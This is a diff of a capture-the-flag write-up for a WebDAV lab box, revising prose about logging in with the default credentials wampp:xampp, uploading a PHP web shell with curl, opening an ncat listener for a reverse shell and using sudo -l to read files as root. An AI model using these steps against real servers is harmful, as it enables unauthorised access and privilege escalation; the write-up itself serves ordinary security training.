@@ -24,15 +24,20 @@ webdav                  [Status: 401, Size: 460, Words: 42, Lines: 15, Duration:
 
 Ffuf found a login page<br>
 <img src = "login.png">
-Webdavs default credentials are: wampp:xampp<br>
+Webdavs default credentials are: **wampp:xampp**<br>
 Lets try to login with this Password and Username<br>
-<img src="fs.png">
-Logged in successfully! We can upload files to webdav like this:
+
+Logged in successfully! Its a filesystem:
+
+<img src="fs.png"><br>
+
+I can upload files to webdav like this:
 ```
 $ curl http://10.10.202.252/webdav/ --user "wampp:xampp" --upload-file ../shell.php
 ```
-
-And now i Will open a netcat session for a better Shell
+After uploading my shell.php file, it should appear in the filesystem<br>
+This is just a simple Remote shell php file, we can write system commands in here and execute them<br>
+And now i Will open a netcat session for a better Shell<br>
 Start the listener:
 ```
 $ ncat -nlvp 8001
@@ -65,7 +70,7 @@ www-data@ubuntu:/home/merlin$ cat user.txt
 <hr>
 <h3> 2. Task: root flag </h3>
 
-Running the command "sudo -l" shows us that i can run cat as root without Password
+Running the command "sudo -l" showed that i can run the cat command as root without Password
 ```
 www-data@ubuntu:/tmp$ sudo -l   
 Matching Defaults entries for www-data on ubuntu:
